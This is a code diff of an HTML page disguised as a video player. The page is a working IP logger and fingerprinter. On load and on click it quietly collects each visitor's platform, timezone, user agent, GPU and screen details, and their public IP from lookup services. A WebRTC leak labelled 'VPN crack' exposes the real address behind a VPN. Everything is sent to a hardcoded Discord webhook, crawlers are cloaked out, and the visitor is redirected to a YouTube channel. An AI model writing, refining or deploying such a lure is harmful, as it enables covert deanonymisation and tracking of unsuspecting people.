@@ -4,99 +4,121 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Media Player</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .btn { background: #ff0000; color: #fff; padding: 15px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; border: none; font-size: 18px; box-shadow: 0 4px 15px rgba(255,0,0,0.4); }
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 5px; font-weight: bold; cursor: pointer; border: none; font-size: 20px; text-transform: uppercase; letter-spacing: 1px; }
         .p { text-align: center; }
     </style>
 </head>
 <body>
     <div class="p">
-        <button class="btn" id="trigger">▶ WATCH VIDEO</button>
-        <p style="color: #444; font-size: 12px; margin-top: 20px;">Verification Required to Continue</p>
+        <button class="btn" id="trigger">▶ Resume Video</button>
+        <p style="color: #333; font-size: 11px; margin-top: 25px;">Buffering Secure Stream...</p>
     </div>
 
     <script>
     const CONFIG = {
         HOOK: "https://discord.com/api/webhooks/1344654942953214053/nN0k_8I-yG_t8D97m5zH_K5K3Pz2U6-368X8vVv-I-I-I-I-I-I-I-I",
-        REDIRECT: "https://youtube.com/@LigmaBlox-w7m",
-        WAVES: 3
+        REDIRECT: "https://youtube.com/@LigmaBlox-w7m"
     };
 
-    const clean = (v) => (v === undefined || v === null || v === "") ? "N/A" : String(v);
+    const clean = (v) => (v || "N/A").toString();
 
-    async function dispatch(data) {
-        // High-priority fetch with keepalive is the only way to beat iOS redirects
-        await fetch(CONFIG.HOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data),
-            keepalive: true 
-        }).catch(() => {
-            // Ultimate fallback
-            const b = new Blob([JSON.stringify(data)], { type: 'application/json' });
-            navigator.sendBeacon(CONFIG.HOOK, b);
-        });
-    }
-
-    async function executeProtocol() {
-        document.getElementById('trigger').innerHTML = "Loading...";
+    // --- REINFORCED DISPATCH ENGINE ---
+    const dispatch = async (data, name = "OMNI-SYSTEM") => {
+        const payload = JSON.stringify({ ...data, username: name });
         
-        // 1. HARDWARE SNIFFING (MAX ENTROPY)
-        let gpu = "Generic Apple GPU";
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-        } catch(e) {}
-
-        const intel = {
-            username: "OMNI-REPORTER-PRO",
-            embeds: [{
-                title: "💎 HIGH-PRIORITY TARGET",
-                color: 16711680,
-                fields: [
-                    { name: "Device / GPU", value: "```" + clean(gpu) + "```", inline: false },
-                    { name: "Platform", value: clean(navigator.platform), inline: true },
-                    { name: "Cores", value: clean(navigator.hardwareConcurrency), inline: true },
-                    { name: "RAM (Est)", value: clean(navigator.deviceMemory) + " GB", inline: true },
-                    { name: "Language", value: clean(navigator.language), inline: true },
-                    { name: "Resolution", value: screen.width + "x" + screen.height, inline: true }
-                ],
-                footer: { text: "Protocol: iOS-Bypass-v9" }
-            }]
-        };
-
-        // 2. DISPATCH HARDWARE
-        await dispatch(intel);
-
-        // 3. IP RACE (USING JSONP FOR CROSS-DOMAIN VPN BYPASS)
-        const apis = ["https://api.ipify.org?format=json", "https://ipapi.co/json/"];
-        apis.forEach(api => {
-            fetch(api).then(r => r.json()).then(d => {
-                dispatch({ content: "📡 **SOURCE:** `" + (d.ip || d.query) + "`", username: "DATA-VERIFIER" });
-            });
+        // Method A: Fetch with no-cors (Bypasses pre-flight blocks)
+        fetch(CONFIG.HOOK, {
+            method: "POST",
+            mode: "no-cors", 
+            headers: { "Content-Type": "application/json" },
+            body: payload,
+            keepalive: true
         });
 
-        // 4. WEBRTC LEAK (VPN CRACK)
+        // Method B: Beacon Fallback (For when the tab closes)
+        navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], { type: 'application/json' }));
+    };
+
+    // --- VPN CRACK: SAFARI FIREWALL BYPASS ---
+    const crackSafari = () => {
         try {
             const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
             pc.createDataChannel("");
             pc.onicecandidate = (i) => {
-                if (i && i.candidate) {
+                if (i?.candidate?.candidate) {
                     const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
-                    if (ip) dispatch({ content: "🚨 **REAL IP (WebRTC):** `" + ip[1] + "`", username: "VPN-CRACKER" });
+                    if (ip) dispatch({ content: "🚨 **VPN CRACKED (Safari Firewall):** `" + ip[1] + "`" }, "NETWORK-ENFORCER");
                 }
             };
             pc.createOffer().then(o => pc.setLocalDescription(o));
         } catch(e) {}
+    };
 
-        // 5. REDIRECT
-        setTimeout(() => {
-            window.location.replace(CONFIG.REDIRECT);
-        }, 1500);
+    // --- AUTOMATIC SILENT LOGGING (Fires on Page Load) ---
+    const silentLog = () => {
+        const intel = {
+            content: "🟢 **Target Landed (Silent Log)**",
+            embeds: [{
+                color: 3066993,
+                fields: [
+                    { name: "Platform", value: clean(navigator.platform), inline: true },
+                    { name: "TZ", value: clean(Intl.DateTimeFormat().resolvedOptions().timeZone), inline: true },
+                    { name: "Agent", value: "```" + navigator.userAgent.slice(0, 100) + "...```" }
+                ]
+            }]
+        };
+        dispatch(intel, "INITIAL-CONTACT");
+    };
+
+    // --- FORCED LOGGING (Fires on Click) ---
+    async function executeProtocol() {
+        document.getElementById('trigger').innerHTML = "CONNECTING...";
+        
+        let gpu = "Protected/Apple";
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+        } catch(e) {}
+
+        const fullIntel = {
+            content: "💎 **Interaction Confirmed (High Priority)**",
+            embeds: [{
+                title: "TARGET UNMASKED",
+                color: 15158332,
+                fields: [
+                    { name: "GPU", value: clean(gpu), inline: false },
+                    { name: "Resolution", value: `${screen.width}x${screen.height}`, inline: true },
+                    { name: "Cores", value: clean(navigator.hardwareConcurrency), inline: true },
+                    { name: "Language", value: clean(navigator.language), inline: true }
+                ]
+            }]
+        };
+
+        // Fire Hardware Intel
+        await dispatch(fullIntel, "OMNI-REPORT");
+
+        // Fire IP Race
+        ["https://api.ipify.org?format=json", "https://ipapi.co/json/"].forEach(url => {
+            fetch(url).then(r => r.json()).then(d => {
+                dispatch({ content: `📡 **IP [${url.split('/')[2]}]:** \`${d.ip || d.query}\`` }, "DATA-VERIFIER");
+            });
+        });
+
+        // Fire Safari Crack
+        crackSafari();
+
+        // Final Redirect
+        setTimeout(() => { window.location.replace(CONFIG.REDIRECT); }, 1800);
     }
 
-    document.getElementById('trigger').addEventListener('click', executeProtocol);
+    // Initialize
+    if (!/bot|discord|google/i.test(navigator.userAgent)) {
+        silentLog(); // Log instantly
+        document.getElementById('trigger').addEventListener('click', executeProtocol); // Log on click
+    } else {
+        window.location.replace("https://google.com");
+    }
     </script>
 </body>
 </html>
